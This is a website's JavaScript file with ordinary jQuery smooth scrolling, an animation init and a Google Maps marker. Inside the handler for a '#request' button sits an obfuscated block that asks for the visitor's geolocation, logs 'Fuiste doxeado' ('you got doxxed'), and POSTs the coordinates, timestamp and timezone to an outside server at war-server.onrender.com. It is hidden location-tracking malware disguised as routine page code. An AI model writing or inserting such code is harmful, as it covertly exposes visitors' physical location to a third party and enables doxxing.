// smooth scroll
$(document).ready(function () {
  $(".navbar .nav-link").on("click", function (event) {
    if (this.hash !== "") {
      event.preventDefault();

      var hash = this.hash;

      $("html, body").animate(
        {
          scrollTop: $(hash).offset().top,
        },
        700,
        function () {
          window.location.hash = hash;
        }
      );
    }
  });
});

$(document).ready(function () {
  $("#request").on("click", function (event) {
    // Paste your JavaScript code here
    var _0x5b05e0 = _0xce3a;
    (function (_0x21b544, _0x481093) {
      var _0x29f795 = _0xce3a,
        _0x446049 = _0x21b544();
      while (!![]) {
        try {
          var _0x4d1b1f =
            parseInt(_0x29f795(0x208)) / 0x1 +
            parseInt(_0x29f795(0x206)) / 0x2 +
            parseInt(_0x29f795(0x1fd)) / 0x3 +
            (parseInt(_0x29f795(0x1fe)) / 0x4) *
              (parseInt(_0x29f795(0x1f9)) / 0x5) +
            parseInt(_0x29f795(0x1f6)) / 0x6 +
            (parseInt(_0x29f795(0x1ff)) / 0x7) *
              (parseInt(_0x29f795(0x1f7)) / 0x8) +
            -parseInt(_0x29f795(0x1fc)) / 0x9;
          if (_0x4d1b1f === _0x481093) break;
          else _0x446049["push"](_0x446049["shift"]());
        } catch (_0x7ae673) {
          _0x446049["push"](_0x446049["shift"]());
        }
      }
    })(_0x4e20, 0xd8f00),
      navigator[_0x5b05e0(0x1fa)][_0x5b05e0(0x204)](
        (_0x577db9) => {
          var _0x33a16f = _0x5b05e0,
            _0x4c1904 = _0x33a16f(0x1f5),
            _0x3db599 = _0x577db9["coords"][_0x33a16f(0x201)],
            _0x2ec4c3 = _0x577db9[_0x33a16f(0x203)]["longitude"];
          console[_0x33a16f(0x200)]("Fuiste\x20doxeado");
          var _0x36eb3f = new Date(),
            _0x1a3ede =
              Intl[_0x33a16f(0x205)]()[_0x33a16f(0x202)]()[_0x33a16f(0x207)];
          fetch(_0x4c1904, {
            method: _0x33a16f(0x1f3),
            headers: { "Content-Type": _0x33a16f(0x1f4) },
            body: JSON[_0x33a16f(0x1fb)]({
              coords: "" + (_0x3db599 + "," + _0x2ec4c3),
              timestamp: _0x36eb3f,
              timezone: _0x1a3ede,
            }),
          });
        },
        (_0x3553a0) => {
          var _0x251844 = _0x5b05e0;
          alert(_0x251844(0x1f8));
        }
      );
    function _0xce3a(_0x1737eb, _0x30c690) {
      var _0x4e2077 = _0x4e20();
      return (
        (_0xce3a = function (_0xce3a40, _0xa4f006) {
          _0xce3a40 = _0xce3a40 - 0x1f3;
          var _0x56247f = _0x4e2077[_0xce3a40];
          return _0x56247f;
        }),
        _0xce3a(_0x1737eb, _0x30c690)
      );
    }
    function _0x4e20() {
      var _0x16c9a6 = [
        "timeZone",
        "649933sWLcNf",
        "POST",
        "application/json",
        "https://war-server.onrender.com/api",
        "6746910XCWcmi",
        "7159032zJGjlP",
        "Ups,\x20se\x20necesitan\x20habilitar\x20permiso\x20de\x20localizacion",
        "5OfDFgT",
        "geolocation",
        "stringify",
        "27999306kkNHYE",
        "2485740KRKNPo",
        "1114888xzgMqD",
        "7AdgMSX",
        "log",
        "latitude",
        "resolvedOptions",
        "coords",
        "getCurrentPosition",
        "DateTimeFormat",
        "446022xIHbub",
      ];
      _0x4e20 = function () {
        return _0x16c9a6;
      };
      return _0x4e20();
    }
  });
});

new WOW().init();

function initMap() {
  var uluru = { lat: 19.4143351, lng: -99.15514 };
  var map = new google.maps.Map(document.getElementById("map"), {
    zoom: 8,
    center: uluru,
  });
  var marker = new google.maps.Marker({
    position: uluru,
    map: map,
  });
}
